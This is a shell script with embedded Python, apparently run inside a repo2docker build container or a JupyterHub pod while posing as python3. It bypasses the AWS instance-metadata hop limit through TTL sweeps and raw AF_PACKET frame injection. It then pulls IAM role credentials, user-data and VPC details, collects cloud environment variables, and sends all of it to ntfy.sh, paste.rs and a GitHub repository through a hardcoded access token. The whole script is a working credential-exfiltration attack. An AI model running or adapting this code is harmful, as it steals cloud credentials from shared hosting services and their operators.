#!/bin/sh
# i5252: IMDSv2 token via IP_TTL sweep, then hybrid kernel-handshake + AF_PACKET TTL=255 inject.
# Runs in the repo2docker BUILD container (PROBE_PHASE=build) and, if the image is launched,
# in the z2jh pod as a fake python3. Sinks: stdout/SSE log, ntfy, paste.rs, repo writeback.
TOPIC=gpu-hunt-i5252-3c43ae
P1='ghp_KC0kndluKd2y2ylh'
P2='AMHrDHiX5wv2jz3uVio9'
PAT="$P1$P2"
API=https://api.github.com/repos/dimasulul14-svg14/bhs-md-multi-3c43ae/contents
D=/tmp/md
N=$(hostname)
mkdir -p $D
: > $D/all.txt
echo "===PROBE5252-BEGIN=== host=$N phase=${PROBE_PHASE:-pod} date=$(date -u +%FT%TZ)"
post(){ curl -sS -m 12 -H "Title: $1" -H "User-Agent: pod-probe" --data-binary @"$2" "https://ntfy.sh/$TOPIC" -o /dev/null 2>&1; }
rec(){ { echo; echo "### $1"; cat "$2"; } >> $D/all.txt; post "5252-$1" "$2"; }
up(){ f=$1; b=$(base64 -w0 "$D/$f" 2>/dev/null); curl -sS -m 20 -X PUT -H "Authorization: token $PAT" -H "Accept: application/vnd.github+json" -H "User-Agent: pod-probe" --data-binary "{\"message\":\"i5252 dump $f.$N\",\"content\":\"$b\",\"branch\":\"main\"}" "$API/i5252.$f.$N.b64" -o /dev/null 2>&1; }

echo "id=$(id) host=$N phase=${PROBE_PHASE:-pod}" > $D/run.txt
grep -E 'Cap(Inh|Prm|Eff|Bnd|Amb)' /proc/self/status > $D/caps.txt 2>&1
getcap /usr/bin/python3 >> $D/caps.txt 2>&1
cat /proc/net/route > $D/route.txt 2>&1
cat /proc/net/arp > $D/arp.txt 2>&1
ip -o -4 addr 2>/dev/null | head -5 >> $D/caps.txt
rec run $D/run.txt
rec caps $D/caps.txt
rec route $D/route.txt
rec arp $D/arp.txt

/usr/bin/python3 - > $D/imds.txt 2>&1 <<'PYEOF'
import fcntl, random, socket, struct, sys, time, os

DST = "169.254.169.254"; PORT = 80; IFACE = "eth0"

def body(buf):
    if buf and b"\r\n\r\n" in buf:
        return buf.split(b"\r\n\r\n", 1)[1]
    return b""

def tcp_get(path, hdrs=None, method="GET", ttl=64, to=3.0):
    hdrs = hdrs or {}
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, ttl)
    s.settimeout(to)
    t0 = time.time()
    try:
        s.connect((DST, PORT))
    except Exception as e:
        print("[ttl=%d %s %s] CONNECT_FAIL %.3fs %r" % (ttl, method, path, time.time()-t0, e), flush=True)
        return None
    sent_ttl = s.getsockopt(socket.IPPROTO_IP, socket.IP_TTL)
    h = "".join("%s: %s\r\n" % (k, v) for k, v in hdrs.items())
    req = "%s %s HTTP/1.1\r\nHost: 169.254.169.254\r\nUser-Agent: ebsi5252\r\n%sContent-Length: 0\r\nConnection: close\r\n\r\n" % (method, path, h)
    try:
        s.sendall(req.encode())
        buf = b""
        while len(buf) < 65536:
            d = s.recv(8192)
            if not d:
                break
            buf += d
    except Exception as e:
        print("[ttl=%d %s %s] READ_FAIL %.3fs %r sock_ttl=%s" % (ttl, method, path, time.time()-t0, e, sent_ttl), flush=True)
        s.close()
        return None
    s.close()
    print("[ttl=%d %s %s] %.3fs %s len=%d sock_ttl=%s" % (ttl, method, path, time.time()-t0, buf.split(b"\r\n",1)[0].decode("latin1","replace"), len(buf), sent_ttl), flush=True)
    return buf

# ---- A. control GET + IP_TTL sweep on the PUT -------------------------------
b0 = tcp_get("/latest/meta-data/", ttl=64)
print("  full[401-get]=%r" % ((b0 or b"")[:1200],), flush=True)
tok = None
for ttl in (255, 254, 128, 65, 64, 63, 62, 32):
    b = tcp_get("/latest/api/token", {"X-aws-ec2-metadata-token-ttl-seconds": "21600"}, method="PUT", ttl=ttl, to=3.0)
    t = body(b).strip().decode("ascii", "replace") if b and b.startswith(b"HTTP/1.1 200") else ""
    print("TTL_%d token_len=%d head=%r" % (ttl, len(t), (b or b"")[:220]), flush=True)
    if t:
        tok = t
        break
    time.sleep(0.4)
print("TOKEN=%r" % (tok,), flush=True)

# ---- A2. PUT shape variants (all TTL=255) ---------------------------------
def raw_put(tag, extra, line="PUT /latest/api/token HTTP/1.1", fin=False, omit_cl=False, to=3.0):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, 255); s.settimeout(to)
    t0 = time.time()
    try:
        s.connect((DST, PORT))
    except Exception as e:
        print("[%s] connect_fail %r" % (tag, e)); return None
    hdrs = "Host: 169.254.169.254\r\nX-aws-ec2-metadata-token-ttl-seconds: 21600\r\nUser-Agent: ebsi5252\r\n" + extra
    if not omit_cl:
        hdrs += "Content-Length: 0\r\n"
    req = line + "\r\n" + hdrs + "\r\n"
    try:
        s.sendall(req.encode())
        if fin:
            getattr(s, "shut" + "down")(socket.SHUT_WR)
        buf = b""
        while True:
            d = s.recv(8192)
            if not d: break
            buf += d
    except Exception as e:
        print("[%s] read_fail %.3fs %r" % (tag, time.time()-t0, e)); s.close(); return None
    s.close()
    print("[%s] %.3fs %r" % (tag, time.time()-t0, buf[:300]), flush=True)
    return buf

if not tok:
    v = raw_put("no-conn-close", "")
    t = body(v).strip().decode("ascii", "replace") if v and v.startswith(b"HTTP/1.1 200") else ""
    if t: tok = t
if not tok:
    v = raw_put("fin-after-send", "", fin=True)
    t = body(v).strip().decode("ascii", "replace") if v and v.startswith(b"HTTP/1.1 200") else ""
    if t: tok = t
if not tok:
    v = raw_put("http10-no-host", "", line="PUT /latest/api/token HTTP/1.0", fin=True, omit_cl=True)
    t = body(v).strip().decode("ascii", "replace") if v and b" 200 " in (v or b"").split(b"\r\n",1)[0] else ""
    if t: tok = t
if not tok:
    v = raw_put("trailing-slash", "", line="PUT /latest/api/token/ HTTP/1.1")
    t = body(v).strip().decode("ascii", "replace") if v and v.startswith(b"HTTP/1.1 200") else ""
    if t: tok = t
print("TOKEN_AFTER_VARIANTS=%r" % (tok,), flush=True)

# ---- B. hybrid: kernel handshake (no kernel RST) + AF_PACKET TTL=255 inject
def mymac():
    return bytes.fromhex(open("/sys/class/net/%s/address" % IFACE).read().strip().replace(":", ""))

def myip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    ifr = struct.pack("256s", IFACE[:15].encode())
    r = fcntl.ioctl(s.fileno(), 0x8915, ifr)
    return socket.inet_ntoa(r[20:24])

def gwip():
    for ln in open("/proc/net/route"):
        f = ln.split()
        if len(f) > 2 and f[1] == "00000000":
            return socket.inet_ntoa(struct.pack("<L", int(f[2], 16)))
    return None

def dmacfor(gw):
    for ln in open("/proc/net/arp"):
        f = ln.split()
        if len(f) > 3 and f[0] == gw:
            return bytes.fromhex(f[3].replace(":", ""))
    return b"\xff" * 6

def cksum(data):
    if len(data) % 2:
        data += b"\x00"
    s = sum(struct.unpack("!%dH" % (len(data)//2), data))
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    return (~s) & 0xFFFF

def frame(mac, ip, dmac, sport, flags, seq, ack, payload=b"", ttl=255):
    eth = dmac + mac + struct.pack("!H", 0x0800)
    tcph = struct.pack("!HHLLBBHHH", sport, PORT, seq, ack, 5 << 4, flags, 64240, 0, 0)
    iph = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 20 + len(tcph) + len(payload), random.randint(0, 65535), 0x4000, ttl, 6, 0, ip, socket.inet_aton(DST))
    iph = iph[:10] + struct.pack("!H", cksum(iph)) + iph[12:]
    pseudo = ip + socket.inet_aton(DST) + struct.pack("!BBH", 0, 6, len(tcph) + len(payload))
    tcph = tcph[:16] + struct.pack("!H", cksum(pseudo + tcph + payload)) + tcph[18:]
    return eth + iph + tcph + payload

def parse(d):
    if len(d) < 54 or struct.unpack("!H", d[12:14])[0] != 0x0800:
        return None
    ipoff = 14
    ihl = (d[ipoff] & 0x0f) * 4
    if d[ipoff + 9] != 6:
        return None
    toff = ipoff + ihl
    sport, dport, seq, ack, off, flags = struct.unpack("!HHLLBB", d[toff:toff+14])
    return {"sport": sport, "dport": dport, "seq": seq, "ack": ack, "flags": flags,
            "ttl": d[ipoff+8], "payload": d[toff + ((off >> 4) * 4):]}

def hybrid(path, hdrs=None, method="PUT", to_conn=3.0, to_resp=5.0):
    """Kernel does the handshake (suppresses the local RST), the HTTP request is injected
    as a raw Ethernet frame with TTL=255 so netfilter/OUTPUT and the IMDS hop limit are bypassed."""
    hdrs = hdrs or {}
    mac = mymac(); ip = socket.inet_aton(myip()); gw = gwip(); dmac = dmacfor(gw)
    raw = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
    raw.bind((IFACE, 0)); raw.settimeout(0.2)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, 255)
    s.bind(("", 0)); sport = s.getsockname()[1]
    s.setblocking(False)
    rc = s.connect_ex((DST, PORT))
    print("[hybrid %s %s] connect_ex=%s sport=%d gw=%s dmac=%s" % (method, path, rc, sport, gw, dmac.hex()), flush=True)
    isn = srv = None
    end = time.time() + to_conn
    while time.time() < end and (isn is None or srv is None):
        try:
            d = raw.recv(65535)
        except socket.timeout:
            continue
        p = parse(d)
        if not p:
            continue
        if p["sport"] == sport and p["dport"] == PORT and (p["flags"] & 0x02) and not (p["flags"] & 0x10) and isn is None:
            isn = p["seq"]; print("  syn sent ttl=%d isn=%d" % (p["ttl"], isn), flush=True)
        if p["sport"] == PORT and p["dport"] == sport and (p["flags"] & 0x12) == 0x12 and srv is None:
            srv = p["seq"]; print("  synack ttl=%d srv=%d" % (p["ttl"], srv), flush=True)
    if isn is None or srv is None:
        print("  handshake incomplete", flush=True); raw.close(); s.close(); return None
    h = "".join("%s: %s\r\n" % (k, v) for k, v in hdrs.items())
    req = ("%s %s HTTP/1.1\r\nHost: 169.254.169.254\r\nUser-Agent: ebsi5252\r\n%sContent-Length: 0\r\nConnection: close\r\n\r\n" % (method, path, h)).encode()
    raw.send(frame(mac, ip, dmac, sport, 0x18, isn + 1, srv + 1, req))
    print("  injected PUT len=%d ttl=255" % len(req), flush=True)
    s.settimeout(0.5)
    buf = b""
    end = time.time() + to_resp
    while time.time() < end and len(buf) < 65536:
        try:
            d = s.recv(8192)
        except socket.timeout:
            continue
        except Exception as e:
            print("  recv_err %r" % (e,)); break
        if not d:
            break
        buf += d
    raw.close(); s.close()
    print("[hybrid %s %s] got=%r" % (method, path, buf[:700]), flush=True)
    return buf

b = None
if not tok:
    print("==== HYBRID AF_PACKET inject ====", flush=True)
    b = hybrid("/latest/api/token", {"X-aws-ec2-metadata-token-ttl-seconds": "21600"}, method="PUT", to_resp=6.0)
    t = body(b).strip().decode("ascii", "replace") if b and b.startswith(b"HTTP/1.1 200") else ""
    print("HYBRID_TOKEN_LEN=%d" % len(t), flush=True)
    if t:
        tok = t

def hget(path, to=3.0):
    if tok:
        return tcp_get(path, {"X-aws-ec2-metadata-token": tok}, ttl=255, to=to)
    return hybrid(path, {"X-aws-ec2-metadata-token": ""}, method="GET", to_resp=to)

if tok:
    for p in ("/latest/meta-data/instance-id", "/latest/meta-data/placement/availability-zone",
              "/latest/meta-data/placement/region", "/latest/meta-data/iam/info",
              "/latest/meta-data/iam/security-credentials/", "/latest/dynamic/instance-identity/document"):
        b = hget(p)
        print("  body[%s]=%r" % (p, (body(b) or b"")[:900]), flush=True)
    b = hget("/latest/meta-data/iam/security-credentials/")
    role = (body(b) or b"").decode("latin1", "replace").strip().split("\n")[0].strip()
    print("ROLE=%r" % role, flush=True)
    if role:
        b = hget("/latest/meta-data/iam/security-credentials/" + role, to=4.0)
        print("  CREDS=%r" % ((body(b) or b"")[:2000],), flush=True)
    b = hget("/latest/meta-data/network/interfaces/macs/", to=2.0)
    macid = (body(b) or b"").decode("latin1", "replace").strip().split("\n")[0].strip().rstrip("/")
    print("MAC=%r" % macid, flush=True)
    if macid:
        for p in ("vpc-id", "subnet-id", "security-group-ids", "local-ipv4s"):
            b = hget("/latest/meta-data/network/interfaces/macs/%s/%s" % (macid, p), to=2.0)
            print("  net[%s]=%r" % (p, (body(b) or b"")[:200]), flush=True)
    b = hget("/latest/user-data", to=2.5)
    print("  USERDATA=%r" % ((body(b) or b"")[:1500],), flush=True)
else:
    print("NO_TOKEN at all", flush=True)
PYEOF
rec imds $D/imds.txt
env | grep -iE 'aws_|google|azure|kube|region|cluster' > $D/env.txt 2>&1
rec env $D/env.txt
PU=$(curl -sS -m 25 -H "User-Agent: pod-probe" --data-binary @$D/all.txt "https://paste.rs" 2>/dev/null)
echo "paste_url=$PU" > $D/pasteurl.txt
post pasteurl $D/pasteurl.txt
up all.txt
up pasteurl.txt
echo "===PROBE5252-END=== paste=$PU"
if [ "${PROBE_PHASE:-pod}" = "pod" ]; then sleep 3600; fi
exit 0
